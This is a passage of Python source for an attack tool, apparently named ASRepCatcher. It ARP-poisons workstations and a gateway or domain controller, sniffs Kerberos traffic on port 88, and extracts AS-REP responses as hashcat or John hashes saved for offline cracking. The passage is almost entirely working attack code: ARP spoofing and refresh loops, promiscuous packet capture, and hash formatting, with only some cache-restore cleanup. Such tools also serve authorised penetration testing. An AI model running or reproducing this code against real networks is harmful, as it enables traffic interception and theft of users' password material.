            rich_print_info(f'[ARP RELAY] Sending initial poison batch {i+1}/3...', 'yellow')
            sendp(packets_list, iface=iface, verbose=False)
            time.sleep(0.5)  # Brief delay between batches
        
        rich_print_success(f'[ARP RELAY] ✓ Initial poisoning complete ({len(packets_list)} packets x 3)')
        rich_print_success(f'[ARP RELAY] ✓ Network traffic now flowing through this machine')
    else:
        rich_print_warning('[ARP RELAY] No packets to send - target list empty')
    
    # Now switch to periodic refresh with MUCH longer interval
    rich_print_info('[ARP RELAY] Switching to low-frequency ARP refresh mode', 'blue')
    rich_print_info('[ARP RELAY] This prevents cache expiration while minimizing network impact', 'blue')
    
    # ARP entries typically expire after 2-5 minutes, so refresh every 30 seconds
    ARP_REFRESH_INTERVAL = 30  # seconds
    
    while not stop_arp_spoofing_flag.is_set():
        # Sleep for most of the interval, but check stop flag frequently
        start_time = time.time()
        while time.time() - start_time < ARP_REFRESH_INTERVAL:
            if stop_arp_spoofing_flag.is_set():
                rich_print_info('[ARP RELAY] Stop flag detected, exiting ARP spoof thread', 'red')
                return
            time.sleep(0.5)  # Check flag twice per second
        
        # Time to refresh ARP cache
        if stop_arp_spoofing_flag.is_set():
            return
            
        # Update target list periodically
        timer += 1
        if timer >= 2:  # Update targets every 2 refresh cycles (60 seconds)
            rich_print_info('[ARP RELAY] Updating target host list...', 'blue')
            mac_addresses = update_uphosts()
            timer = 0
        
        # Only if we have targets
        if Targets != set():
            packets_list = []
            
            # Create refresh packets - same logic as initial poisoning but sent less frequently
            for target in mac_addresses:
                if stop_arp_spoofing_flag.is_set():
                    return
                    
                # Refresh client ARP cache (DC -> our MAC)
                packets_list.append(Ether(src=hwsrc, dst=mac_addresses[target]) / 
                                   ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target))
                
                # Refresh DC ARP cache (client -> our MAC)
                packets_list.append(Ether(src=hwsrc, dst=dc_mac) / 
                                   ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc))
            
            # Send refresh packets once - no need for multiple sends during refresh
            if packets_list:
                rich_print_info(f'[ARP RELAY] Refreshing ARP cache with {len(packets_list)} packets', 'blue')
                sendp(packets_list, iface=iface, verbose=False)
            else:
                rich_print_warning('[ARP RELAY] No packets to send during refresh - target list empty')

def listenmode_arp_spoof():
    # CRITICAL: Use EXACT same method as working Linux version!
    # In listen mode, poison GATEWAY's ARP cache with ALL targets at once
    rich_print_info(f'[ARP LISTEN] LINUX METHOD: Batch gateway ARP poisoning', 'red')
    rich_print_info(f'[ARP LISTEN] Targets: {list(Targets)} ({len(Targets)} hosts)', 'yellow')
    rich_print_info(f'[ARP LISTEN] Gateway: {gw}, Interface: {iface}', 'yellow')
    
    try:
        gateway_mac = getmacbyip(gw)
        if not gateway_mac:
            rich_print_error(f'[ARP LISTEN] Cannot get gateway MAC for {gw}')
            return
        rich_print_info(f'[ARP LISTEN] Gateway MAC: {gateway_mac}, Our MAC: {hwsrc}', 'cyan')
    except Exception as e:
        rich_print_error(f'[ARP LISTEN] Error: {e}')
        return
    
    packet_count = 0
    
    try:
        while not stop_arp_spoofing_flag.is_set():
            if Targets != set():
                try:
                    # EXACT Linux method: Send single packet with ALL targets as sources
                    # This tells gateway: "ALL these target IPs are at MY MAC address"
                    # Original Linux code: sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), iface=iface, verbose=False)
                    arp_packet = Ether(src=hwsrc, dst=gateway_mac) / ARP(
                        op=2,               # ARP Reply
                        hwsrc=hwsrc,        # Our MAC address
                        psrc=list(Targets)  # CRITICAL: ALL target IPs at once (Linux method)
                    )
                    
                    sendp(arp_packet, iface=iface, verbose=False)
                    packet_count += 1
                    
                    if packet_count % 10 == 0:
                        rich_print_success(f'[ARP LISTEN] ✓ Linux method: {packet_count} batch ARP packets sent')
                        rich_print_info(f'[ARP LISTEN] ✓ Told gateway: {len(Targets)} targets are at {hwsrc}', 'green')
                        add_debug_message(f"Batch ARP #{packet_count}: {len(Targets)} targets -> gateway")
                    
                except Exception as e:
                    rich_print_error(f'[ARP LISTEN] Error with Linux ARP method: {e}')
                    
            # Check for stop flag more frequently - break sleep into smaller chunks
            for i in range(10):  # 10 x 0.1 second = 1 second total
                if stop_arp_spoofing_flag.is_set():
                    break
                time.sleep(0.1)
                
    except KeyboardInterrupt:
        rich_print_info('[ARP LISTEN] ARP spoofing interrupted by user', 'yellow')
        stop_arp_spoofing_flag.set()
    except Exception as e:
        rich_print_error(f'[ARP LISTEN] Unexpected error in ARP spoofing: {e}')
        stop_arp_spoofing_flag.set()
    finally:
        rich_print_info(f'[ARP LISTEN] ARP spoofing stopped after {packet_count} packets', 'cyan')

def restore(poisoned_device, spoofed_ip):
    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
    send(packet, verbose = False, count=1)

def restore_listenmode(dic_mac_addresses):
    packets_list = []
    gateway_mac = getmacbyip(gw)
    for ip_address in dic_mac_addresses :
        packets_list.append(Ether(src = hwsrc, dst=gateway_mac) / ARP(op = 2, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]))
    sendp(packets_list, iface=iface, verbose = False)

def restore_relaymode(dic_mac_addresses):
    packets_list = []
    gateway_mac = getmacbyip(gw)
    for target in dic_mac_addresses :
        packets_list.append(Ether(src = hwsrc, dst=dic_mac_addresses[target]) / ARP(op = 2, psrc = gw, hwsrc = gateway_mac))
    sendp(packets_list, iface=iface, verbose = False)

def update_uphosts():
    global Targets
    mac_addresses = get_mac_addresses(list(InitialTargets))
    new_hosts = set(mac_addresses.keys()) - Targets
    old_hosts = Targets - set(mac_addresses.keys())
    if len(old_hosts) > 0 : 
        logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
        Targets.difference_update(old_hosts)
    if len(new_hosts) > 0 :
        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
        Targets.update(new_hosts)
    if len(new_hosts) > 0 or len(old_hosts) > 0 :
        logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
        if Targets == set() : logging.warning(f'[!] No more target is up. Continuing probing targets...')
    return mac_addresses

def restore_all_targets():
    if mode == 'relay':
        restore_relaymode(get_mac_addresses(list(Targets)))
    elif mode == 'listen':
        restore_listenmode(get_mac_addresses(list(Targets)))

# ============================================================================
# KERBEROS PROCESSING FUNCTIONS
# ============================================================================

def print_asrep_hash(username, domain, etype, cipher):
    """
    ENHANCED: Improved hash extraction and formatting with better error handling
    Creates proper hash format for hashcat or john and saves to file with better debug info
    """
    global HashFormat, outfile, debug, hashes_captured
    
    try:
        # Format the hash according to the chosen tool format
        if HashFormat == 'hashcat':
            if etype == 17 or etype == 18:
                # AES hash format
                HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
                hash_type = "AES"
            else:
                # RC4 hash format (default)
                HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
                hash_type = "RC4"
        else:
            # John format
            if etype == 17 or etype == 18:
                HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
                hash_type = "AES"
            else:
                HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
                hash_type = "RC4"
        
        # Show success with more information
        rich_print_success(f'[CAPTURE] ✓ Successfully formatted {hash_type} hash for {username}@{domain}')
        
        # Use Rich formatting for hash display
        rich_print_hash(username, domain, etype, HashToCrack)
        
        # Increment the hash counter
        hashes_captured += 1
        
        # Show hashcat instructions if needed
        if etype == 17 and HashFormat == 'hashcat':
            rich_print_info('You will need to download hashcat beta version to crack it: https://hashcat.net/beta/ mode: 32100')
        if etype == 18 and HashFormat == 'hashcat':
            rich_print_info('You will need to download hashcat beta version to crack it: https://hashcat.net/beta/ mode: 32200')
        
        # Write hash to output file
        with open(outfile, 'a') as f:
            f.write(HashToCrack + '\n')
        
        rich_print_success(f'[CAPTURE] ✓ Hash saved to {outfile}')
        return HashToCrack
        
    except Exception as e:
        rich_print_error(f'[ERROR] Failed to format or save hash: {e}')
        if debug:
            import traceback
            rich_print_error(f'[DEBUG] {traceback.format_exc()}')
        return None

# ============================================================================
# AS-REP PROCESSING - Using working logic from listen mode
# ============================================================================

def handle_as_rep(packet):
    """
    EXACT COPY of the working Linux handle_as_rep function - uses packet.root directly
    This is the function that relay_asreq_to_dc calls in the working Linux version
    """
    global UsernamesCaptured
    
    try:
        decoder.start(bytes(packet.root.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(packet.root.crealm))
        domain = decoder.read()[1].decode().lower()
        rich_print_info(f'[+] Got ASREP for username: {username}@{domain}', 'green')
        
        if username.endswith('$'):
            rich_print_info(f'[*] Machine account: {username}, skipping...', 'yellow')
            return
            
        decoder.start(bytes(packet.root.encPart.etype))
        etype = decoder.read()[1]
        decoder.start(bytes(packet.root.encPart.cipher))
        cipher = decoder.read()[1].hex()
        
        if username in UsernamesCaptured and etype in UsernamesCaptured[username]:
            rich_print_info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...', 'yellow')
            return
        else:
            if username in UsernamesCaptured:
                UsernamesCaptured[username].append(etype)
            else:
                UsernamesCaptured[username] = [etype]
        
        print_asrep_hash(username, domain, etype, cipher)
        rich_print_success(f'[RELAY] 🎯 HASH EXTRACTED FOR {username}@{domain}!')
        
    except Exception as e:
        rich_print_error(f'[AS-REP] handle_as_rep failed: {e}')
        if debug:
            import traceback
            rich_print_error(f'[AS-REP] handle_as_rep traceback: {traceback.format_exc()}')

def parse_dc_response(packet):
    """
    ENHANCED CAPTURE VERSION: Improved parsing logic for better hash capture
    Enhanced with TCP session support and additional debug information
    """
    global Targets, InitialTargets
    
    # First check if this is a raw packet or one that needs TCP extraction
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            # Print extended debug info to help diagnose capturing issues
            rich_print_info(f'[SNIFFER] TCP packet: {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport} ({len(packet[Raw].load)} bytes)', 'cyan')
            
            # Try to parse the raw payload as Kerberos
            payload = packet[Raw].load
            # Create a new KerberosTCPHeader from the raw TCP payload
            kerberos_packet = KerberosTCPHeader(payload)
            # Recursively call this function with the extracted Kerberos packet
            parse_dc_response(kerberos_packet)
            return
        except Exception as e:
            if debug:
                rich_print_warning(f'[SNIFFER] TCP extraction failed: {e}', 'yellow')
    
    try:
        # Check for TGS-REP first
        if packet.haslayer(KRB_TGS_REP):
            rich_print_info(f'[SNIFFER] TGS-REP packet detected!', 'green')
            try:
                decoder.start(bytes(packet.root.cname.nameString[0]))
                username = decoder.read()[1].decode().lower()
                decoder.start(bytes(packet.root.crealm))
                domain = decoder.read()[1].decode().lower()
                rich_print_info(f'[SNIFFER] Found TGS-REP for user {username}@{domain}', 'green')
                add_debug_message(f"TGS-REP: {username}@{domain}")
                return
            except Exception as e:
                rich_print_warning(f'[SNIFFER] TGS-REP parsing failed: {e}')
                if debug:
                    add_debug_message(f"TGS-REP parse error: {e}")
                    rich_print_info(f'[DEBUG] TGS-REP packet structure: {packet.show()}', 'cyan')

        # ENHANCED: Check for AS-REP with better debugging
        if not packet.haslayer(KRB_AS_REP):
            rich_print_info('[SNIFFER] Packet is not AS-REP, skipping', 'yellow')
            return

        # ENHANCED: Parse AS-REP with better error handling and more debug info
        try:
            rich_print_success('[SNIFFER] ✓ AS-REP PACKET DETECTED!')
            
            decoder.start(bytes(packet.root.cname.nameString[0]))
            username = decoder.read()[1].decode().lower()
            decoder.start(bytes(packet.root.crealm))
            domain = decoder.read()[1].decode().lower()
            
            rich_print_success(f'[CAPTURE] ✓ Got AS-REP for username: {username}@{domain}')
            add_debug_message(f"AS-REP captured for: {username}@{domain}")
            
            if username.endswith('$'):
                rich_print_info(f'[SNIFFER] Machine account: {username}, skipping...', 'yellow')
                return
                
            decoder.start(bytes(packet.root.encPart.etype))
            etype = decoder.read()[1]
            rich_print_info(f'[SNIFFER] Encryption type: {etype}', 'cyan')
            
            decoder.start(bytes(packet.root.encPart.cipher))
            cipher = decoder.read()[1].hex()
            rich_print_info(f'[SNIFFER] Cipher data: {cipher[:40]}...', 'cyan')
            
            # Username tracking has been removed - always process the hash
            
            print_asrep_hash(username, domain, etype, cipher)
            
            if mode == 'listen' and stop_spoofing and not disable_spoofing:
                try:
                    Targets.remove(packet[IP].dst)
                    InitialTargets.remove(packet[IP].dst)
                    restore(gw, packet[IP].dst)
                    rich_print_info(f'[+] Restored arp cache of {packet[IP].dst}', 'green')
                except (KeyError, ValueError):
                    pass  # Target already removed or not in list
                    
        except Exception as e:
            rich_print_error(f'[AS-REP] Linux-method parsing failed: {e}')
            if debug:
                import traceback
                rich_print_error(f'[AS-REP] Traceback: {traceback.format_exc()}')
                add_debug_message(f"AS-REP parse error: {e}")
                
    except Exception as e:
        rich_print_error(f'[ERROR] Exception in parse_dc_response: {e}')
        if debug:
            import traceback
            rich_print_error(f'[ERROR] Traceback: {traceback.format_exc()}')
            add_debug_message(f"parse_dc_response error: {e}")

# ============================================================================
# PACKET SNIFFER FUNCTIONS
# ============================================================================

# The relay server functionality has been removed.
# ASRepCatcher now uses only the packet sniffer to capture Kerberos traffic.

# TGS/AS request handling is now performed solely by the packet sniffer
# The relay server functions have been completely removed
                
# All relay server code has been removed.
# The packet sniffer component captures AS-REP hashes directly now.

# Relay functionality removed - packet sniffer is now the only capture method

# Port 88 functions removed - no longer need to bind to port 88

# Kerberos server functionality removed - we now use the packet sniffer exclusively

# ============================================================================
# MODE FUNCTIONS
# ============================================================================

def listen_mode():
    global stop_sniffer
    
    # RESET all stop flags to ensure clean start
    stop_arp_spoofing_flag.clear()
    stop_sniffer.clear()  # Make sure sniffer flag is also cleared
    rich_print_info('[LISTEN] Reset stop flags - ensuring clean startup', 'cyan')
    
    try :
        # Start ARP spoofing in background (if enabled)
        if not disable_spoofing:
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.daemon = True
            thread.start()
            rich_print_info('[+] ARP spoofing started in background', 'green')
        
        # SIMPLIFIED: Use basic port 88 filter like the working Linux version
        rich_print_info('[LISTEN] Starting packet capture - LINUX ARP METHOD...', 'green')
        rich_print_info('[LISTEN] Filter: "src port 88" (same as working Linux version)', 'cyan')
        rich_print_info(f'[LISTEN] Targets: {list(Targets)}, Gateway: {gw}', 'cyan')
        rich_print_info('[LISTEN] ARP METHOD: Batch poisoning gateway cache (Linux approach)', 'yellow')
        
        # Note about ICMP redirects - these are normal and expected
        rich_print_warning('[LISTEN] NOTE: ICMP redirects are normal during ARP spoofing')
        rich_print_warning('[LISTEN] They indicate network is responding to our ARP poisoning')
        rich_print_warning('[LISTEN] Not a problem - shows routing is being affected as intended')
        
        # Windows-specific: Enable promiscuous mode to capture redirected packets + TCP sessions
        rich_print_info('[LISTEN] Using Windows promiscuous mode with TCP session support', 'yellow')
        rich_print_info('[LISTEN] TCP sessions enable proper packet reassembly for Kerberos', 'yellow')
        rich_print_info('[LISTEN] Press Ctrl+C to stop packet capture...', 'cyan')
        
        # Check for TCP session availability
        if HAVE_TCP_SESSION:
            tcp_session_available = True
            rich_print_success('[TCP SESSION] TCP session support available - enables packet reassembly')
        else:
            tcp_session_available = False
            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
        
        # Enhanced loop with longer capture sessions and better error handling
        rich_print_info('[LISTEN] Starting continuous packet capture loop...', 'green')
        
        capture_round = 0
        while not stop_arp_spoofing_flag.is_set():
            try:
                capture_round += 1
                if debug:
                    rich_print_info(f'[LISTEN] Capture round {capture_round} starting', 'cyan')
                
                # Use longer capture sessions to reduce loop overhead
                if tcp_session_available:
                    # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
                    sniff(
                        filter="src port 88", 
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        session=TCPSession,  # CRITICAL: TCP packet reassembly
                        count=50,  # Increased from 10 to reduce loop frequency
                        timeout=10  # Increased from 2 to reduce CPU usage
                    )
                else:
                    # Fallback without TCP session
                    sniff(
                        filter="src port 88", 
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        count=50,  # Increased from 10
                        timeout=10  # Increased from 2
                    )
                
                # Add small sleep to prevent tight loop if sniff returns immediately
                if not stop_arp_spoofing_flag.is_set():
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                rich_print_info('[LISTEN] Keyboard interrupt in capture loop', 'yellow')
                break
            except Exception as sniff_e:
                if "timeout" not in str(sniff_e).lower():
                    rich_print_warning(f'[LISTEN] Sniff exception (round {capture_round}): {sniff_e}')
                    if debug:
                        import traceback
                        rich_print_info(f'[LISTEN DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
                # Continue the loop regardless - don't let exceptions stop listening
                time.sleep(0.5)  # Brief pause on error
        
    except KeyboardInterrupt:
        rich_print_info('\n[LISTEN] Packet capture stopped by user', 'yellow')
        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
    except Exception as e:
        rich_print_error(f'[LISTEN] Error in listen mode: {e}')
        if debug:
            import traceback
            rich_print_info(f'[LISTEN DEBUG] Full traceback: {traceback.format_exc()}', 'cyan')
    finally :
        console.print()  # Add newline
        
        # Use centralized cleanup
        cleanup_all()
        
        # Show session summary
        console.print("\n[bold green]Session Summary[/bold green]")
        console.print(f"[green]Hashes Captured:[/green] {hashes_captured}")
        console.print(f"[yellow]Output File:[/yellow] {outfile}")
        rich_print_success(f'Hashes have been saved to {outfile}')

# Define the sniffer function at the module level so it's available everywhere
def run_sniffer():
    """Start packet sniffer in a separate thread for capturing Kerberos traffic"""
    global tcp_session_available
    
    rich_print_info('[SNIFFER] Starting packet sniffer to capture Kerberos traffic', 'green')
    rich_print_info('[SNIFFER] This will capture all port 88 traffic for hash extraction', 'yellow')
    
    # Brief delay before starting to avoid race conditions
    time.sleep(1)
    
    try:
        # Check for TCP session availability
        if HAVE_TCP_SESSION:
            tcp_session_available = True
            rich_print_success('[SNIFFER] ✓ TCP session support available - better packet reassembly')
        else:
            tcp_session_available = False
            rich_print_warning('[SNIFFER] TCP session support not available - basic mode only')
        
        while not stop_sniffer.is_set():
            try:
                rich_print_info('[SNIFFER] Active: Listening for Kerberos traffic...', 'cyan')
                
                if tcp_session_available:
                    # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
                    # More aggressive settings to ensure we catch the packets
                    sniff(
                        filter="port 88", # Capture both directions
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        session=TCPSession,  
                        count=50,  # Increased for better capture chance
                        timeout=5   # Shorter timeout for more frequent processing
                    )
                else:
                    # Fallback without TCP session
                    sniff(
                        filter="port 88", # Capture both directions
                        prn=parse_dc_response, 
                        iface=iface, 
                        store=False, 
                        promisc=True, 
                        count=50,  
                        timeout=5   
                    )
                
                # Keep checking if we have any captured hashes and report status
                if not stop_sniffer.is_set():
                    time.sleep(0.05) # Very short sleep to keep capturing frequently
                    
                    # Periodically print a status update on hash captures
                    if time.time() % 30 < 0.1:  # Roughly every 30 seconds
                        rich_print_info(f'[STATUS] Sniffer running and monitoring for Kerberos traffic', 'green')
                    
            except KeyboardInterrupt:
                break
            except Exception as sniff_e:
                if "timeout" not in str(sniff_e).lower():
                    rich_print_warning(f'[SNIFFER] Sniff exception: {sniff_e}')
                    if debug:
                        import traceback
                        rich_print_info(f'[SNIFFER DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
                # Continue the loop regardless - don't let exceptions stop listening
                time.sleep(0.5)  # Brief pause on error
    except Exception as e:
        rich_print_error(f'[SNIFFER] Error in packet sniffer: {e}')

def relay_mode():
    """Simplified relay mode that uses only packet sniffing (no relay server)"""
    global stop_sniffer
    
    # RESET all stop flags to ensure clean start - this fixes early exit issue
    stop_arp_spoofing_flag.clear()
    stop_sniffer.clear()  # Make sure sniffer flag is also cleared
    rich_print_info('[RELAY] Reset stop flags - ensuring clean startup', 'cyan')
    
    try:
        rich_print_info('[RELAY] Starting simplified sniffing mode (relay server removed)', 'green')
        
        # 1. Start ARP spoofing directly (no relay server needed)
        if not disable_spoofing:
            rich_print_info('[RELAY] Starting ARP spoofing to redirect traffic through this machine', 'green')
            thread = threading.Thread(target=relaymode_arp_spoof, args=(dc,))
            thread.daemon = True
            thread.start()
            rich_print_success('[RELAY] ✓ ARP spoofing started in background')
        else:
            rich_print_info('[RELAY] ARP spoofing disabled by user', 'yellow')
        
        # 2. Set up TCP session support for better packet capture
        global tcp_session_available
        
        if HAVE_TCP_SESSION:
            tcp_session_available = True
            rich_print_success('[TCP SESSION] ✓ TCP session support available - enables packet reassembly')
        else:
            tcp_session_available = False
            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
        
        # 3. Start packet sniffer
        rich_print_info('[RELAY] Starting packet sniffer for AS-REP capture', 'green')
        stop_sniffer = threading.Event()
        sniffer_thread = threading.Thread(target=run_sniffer)
        sniffer_thread.daemon = True
        sniffer_thread.start()
        rich_print_success('[RELAY] ✓ Packet sniffer started successfully')
        
        # 4. Main thread monitors activity
        rich_print_info('[RELAY] Main thread monitoring for hash captures...', 'blue')
        try:
            while not stop_sniffer.is_set():
                try:
                    # Monitor hash captures
                    rich_print_info(f'[RELAY] Monitoring for Kerberos authentication activity', 'cyan')
                        
                    # Sleep for a bit to reduce CPU usage
                    time.sleep(5)
                    
                except KeyboardInterrupt:
                    rich_print_info('[RELAY] Received keyboard interrupt, shutting down...', 'yellow')
                    stop_arp_spoofing_flag.set()
                    stop_sniffer.set()
                    break
        except Exception as e:
            rich_print_error(f'[RELAY] Error in monitoring loop: {e}')
            if debug:
                import traceback
                rich_print_error(f'[DEBUG] {traceback.format_exc()}')
        
    except KeyboardInterrupt:
        rich_print_info('\n[RELAY] Relay mode stopped by user', 'yellow')
        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
        stop_sniffer.set()  # Signal sniffer thread to stop
    except Exception as e:
        rich_print_error(f'[RELAY] Error in relay mode: {e}')
        if debug:
            import traceback
            rich_print_error(f'[DEBUG] Full traceback: {traceback.format_exc()}')
    finally:
        console.print()  # Add newline
        
        # Stop sniffer if it's running
        stop_sniffer.set()
        
        # Use centralized cleanup
        cleanup_all()
        
        # Show session summary
        console.print("\n[bold green]Session Summary[/bold green]")
        console.print(f"[green]Hashes Captured:[/green] {hashes_captured}")
        console.print(f"[yellow]Output File:[/yellow] {outfile}")
        rich_print_success(f'Hashes have been saved to {outfile}')

# ============================================================================
# MAIN FUNCTION
# ============================================================================

def main():
    # Set up signal handlers for graceful cleanup IMMEDIATELY
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Register cleanup function to run on normal exit
    atexit.register(cleanup_all)
    
    # Initialize Rich console first
    global setup_complete
    setup_complete = False
    
    # Confirm Kerberos layer availability
    rich_print_success('[IMPORT] ✓ Scapy Kerberos layers loaded')
    
    global mode, outfile, HashFormat, iface, disable_spoofing, stop_spoofing
    global gw, dc, debug, hwsrc, Targets, InitialTargets, TargetsList
    global firewall_backup_file, original_ip_forward
    global relay_port, skip_redirection
    
    display_banner()

    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Clients are forced to use RC4 if supported.\n"
                                                                                    "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
    parser.add_argument('-outfile', action='store', help='Output file name to write hashes to crack.')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity.')
    group = parser.add_argument_group('ARP poisoning')
    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
    group.add_argument('-tf', action='store', metavar = "targets file", help='File containing client workstations IP addresses.')
    group.add_argument('-gw', action='store', metavar = "Gateway IP", help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
    parser.add_argument('-dc', action='store', metavar = "DC IP", help='Domain controller\'s IP.')
    parser.add_argument('-iface', action='store', metavar = "interface", help='Interface to use. Uses default interface if not specified.')
    parser.add_argument('--port', action='store', type=int, default=88, metavar="PORT", help='Port to use for relay server (default: 88). Use alternative port if 88 is in use.')
    parser.add_argument('--skip-redirection', action='store_true', default=False, help='Skip setting up traffic redirection (useful for testing or when using external redirection)')
    group.add_argument('--stop-spoofing', action='store_true', default=False, help='Stops poisoning the target once an AS-REP packet is received from it. False by default.')
    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if not is_admin():
        rich_print_error("Please run as Administrator")
        sys.exit(1)

    parameters = parser.parse_args()

    if parameters.t is not None and parameters.tf is not None :
        rich_print_error('Cannot use -t and -tf simultaneously')
        sys.exit(1)

    # Parse arguments and set global variables
    mode = parameters.mode
    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
    HashFormat = parameters.format
    iface = parameters.iface if parameters.iface is not None else conf.iface
    disable_spoofing = parameters.disable_spoofing
    stop_spoofing = parameters.stop_spoofing
    dc = parameters.dc
    debug = parameters.debug
    relay_port = parameters.port if hasattr(parameters, 'port') else 88
    skip_redirection = parameters.skip_redirection if hasattr(parameters, 'skip_redirection') else False

    # Validate and select interface
    if iface not in get_if_list():
        if parameters.iface is not None:
            logging.error(f'[!] Interface {iface} was not found. Quitting...')
            sys.exit(1)
        else:
            logging.warning(f'[!] Default interface {iface} is not valid on this system.')
            print('[*] Available interfaces will be shown for selection...')
            iface = select_interface()
            if not iface:
                logging.error('[!] No interface selected. Quitting...')
                sys.exit(1)

    # Set gateway after interface is confirmed
    try:
        gw = parameters.gw if parameters.gw is not None else netifaces.gateways()['default'][netifaces.AF_INET][0]
        rich_print_info(f'[CONFIG] Gateway set to: {gw} (from {"command line" if parameters.gw else "auto-detected default route"})', 'cyan')
    except Exception as e:
        if parameters.gw is not None:
            gw = parameters.gw
            rich_print_info(f'[CONFIG] Using specified gateway: {gw}', 'cyan')
        else:
            rich_print_error(f'[CONFIG] Could not auto-detect gateway: {e}')
            rich_print_error('[CONFIG] Please specify gateway with -gw argument')
            sys.exit(1)

    if iface != conf.iface and parameters.gw is None and not disable_spoofing :
        logging.error('[!] Specified interface is not the default one. You have to specify gateway IP')
        sys.exit(1)

    if stop_spoofing and disable_spoofing :
        logging.warning('[!] --stop-spoofing used with --disable-spoofing. Will ignore --stop-spoofing')
        stop_spoofing = False

    if debug :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG, force=True)
        logging.getLogger('asyncio').setLevel(logging.INFO)
    else :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO, force=True)

    if parameters.mode == 'relay' and parameters.dc is None :
        logging.error('[!] Must specify DC IP in relay mode. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and not valid_ip(parameters.dc) :
        logging.error('[!] DC is not a valid IP.')
        sys.exit(1)

    if parameters.gw is not None and not valid_ip(parameters.gw) :
        logging.error('[!] Gateway is not a valid IP.')
        sys.exit(1)

    # Network interface configuration - with fallback to interface selection
    rich_print_info('Starting network interface configuration...', 'cyan')
    rich_print_info('Processing interface with timeout protection...', 'blue')
    
    # Don't check stop flag during initialization - this was causing early exits
    # The stop flag should only be checked AFTER we start the main mode operations
    
    try:
        rich_print_info('Getting interface IP address...', 'blue')
        # Use Scapy functions to get interface details since we're using Scapy names
        iface_ip = get_if_addr(iface)
        if debug:
            rich_print_info(f'Interface IP: {iface_ip}', 'blue')
        if not iface_ip or iface_ip == '0.0.0.0':
            raise ValueError(f"Interface {iface} has no valid IP address")
        
        rich_print_info('Setting up default netmask and MAC...', 'blue')
        # Try to get netmask and MAC from netifaces if possible
        netmask = '255.255.255.0'  # Default fallback
        hwsrc = None
        
        # Removed stop flag check - was causing premature exits
        
        try:
            if debug:
                rich_print_info('Attempting to get interface details from netifaces...', 'blue')
            # Try to find corresponding netifaces interface by IP matching
            for neti_name in netifaces.interfaces():
                # Removed stop flag check in loop - let initialization complete
                
                try:
                    neti_addrs = netifaces.ifaddresses(neti_name)
                    if netifaces.AF_INET in neti_addrs:
                        neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                        if neti_ip == iface_ip:
                            netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
                            # Get MAC address
                            if netifaces.AF_LINK in neti_addrs:
                                hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
                            break
                except:
                    continue
        except:
            pass
        
        if debug:
            rich_print_info('Netifaces processing completed', 'blue')
        # If we couldn't get MAC from netifaces, use a fallback
        if not hwsrc:
            hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later by ARP operations
        
        if debug:
            rich_print_info(f'Final interface details - IP: {iface_ip}, MAC: {hwsrc}, Netmask: {netmask}', 'blue')
            rich_print_info('Creating subnet configuration...', 'blue')
        iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
        if debug:
            rich_print_info(f'Interface subnet: {iface_subnet}', 'blue')
